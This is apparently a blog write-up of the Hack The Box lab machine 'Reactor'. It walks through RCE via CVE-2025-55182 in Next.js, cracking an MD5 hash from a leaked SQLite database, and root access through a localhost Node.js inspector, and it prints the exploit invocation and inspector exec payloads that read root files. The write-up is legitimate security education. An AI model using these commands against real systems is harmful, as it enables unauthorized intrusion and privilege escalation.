---
title: "Reactor"
description: "Hack The Box machine write-up"
summary: "Reactor started with React Server Components RCE, then moved through a leaked SQLite database and ended with a root Node.js inspector session on localhost."
date: 2026-09-04T00:00:00+02:00
lastmod: 2026-09-04T00:00:00+02:00
tags:
  - CTF
  - walkthrough
  - web
  - React
  - Next.js
  - RCE
  - Linux
categories:
  - writeup
cover: "covers/reactor.png"
draft: false
---

<!--more-->

Reactor was a clean chain: fingerprint the web app, turn a React Server Components bug into command execution, recover an SSH credential from the app database, then abuse a root Node.js inspector bound to localhost.


## Recon

I started with the usual service scan:

```bash
nmap -sV -sC -sS 10.129.119.52
```

The box exposed SSH on port 22 and a web service on port 3000.

![nmap scan showing SSH and a Next.js service on port 3000](/img/Reactor/nmap.png)

The HTTP fingerprint was the useful part. The response headers showed a Next.js app, including `X-Powered-By: Next.js` and `x-nextjs-cache`.

With that lead, I ran Nuclei against the app:

```bash
nuclei -target http://10.129.119.52:3000/
```

![nuclei finding CVE-2025-55182 on the Next.js app](/img/Reactor/Nuclei.png)

Nuclei flagged `CVE-2025-55182`, the React Server Components unauthenticated RCE issue. React's advisory describes the bug as remote code execution through crafted requests to Server Function endpoints, and Next.js was one of the affected frameworks.

## Getting Code Execution

I used the [exploit](https://github.com/Chocapikk/CVE-2025-55182/blob/main/exploit.py) to test a simple command first:

```bash
python3 exploit.py -u http://10.129.119.52:3000/ -c "id"
```

![exploit output showing command execution as the node user](/img/Reactor/RCE.png)

That returned:

```text
uid=999(node) gid=988(node) groups=988(node)
```

So the first shell context was the application user, `node`.

## Reading The App Database

From the app directory, I found a SQLite database beside the Next.js project files:

![listing the reactor app directory with reactor.db present](/img/Reactor/db.png)

The database contained user rows for `admin` and `engineer`, including password hashes:

![database dump showing admin and engineer hash rows](/img/Reactor/hashes.png)

The `engineer` hash was MD5, and CrackStation recovered it:

![CrackStation result showing the engineer MD5 hash was cracked](/img/Reactor/crack.png)

 SSH gave me a proper shell as `engineer`.

## Process Enumeration

As `engineer`, I looked at the running processes:

```bash
ps -ef
```

![process list from the engineer shell](/img/Reactor/showprocess.png)

The important line was a root-owned Node.js process:

```text
/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

Node's own debugging guide warns that the inspector has full access to the Node.js execution environment, and that local applications have unrestricted access even when the inspector is bound to `127.0.0.1`. That made the localhost binding a privilege escalation path instead of a protection.

## Root Through Node Inspector

From the `engineer` shell, I connected to the inspector:

```bash
node inspect 127.0.0.1:9229
```

![connecting to the local Node.js inspector](/img/Reactor/connectNode.png)

One detail here matters. A plain command showed my current user context, but the debugger's `exec(...)` command evaluates inside the debugged script's context. Checking the target process UID confirmed that the inspector session was attached to a root process:

```js
exec("process.getuid()")
```

![Node inspector returning uid 0 from process.getuid](/img/Reactor/root.png)

From there, reading the root flag was just command execution inside the root-owned Node process:

```js
exec("process.mainModule.require('child_process').execSync('cat /root/root.txt').toString()")
```

![reading the root flag through the Node inspector](/img/Reactor/flag.png)

That completed Reactor.

## Takeaways

The initial RCE only landed as `node`, but it was enough to read application-local data. The weak MD5 hash turned that into SSH access as `engineer`, and the root-owned inspector finished the chain.


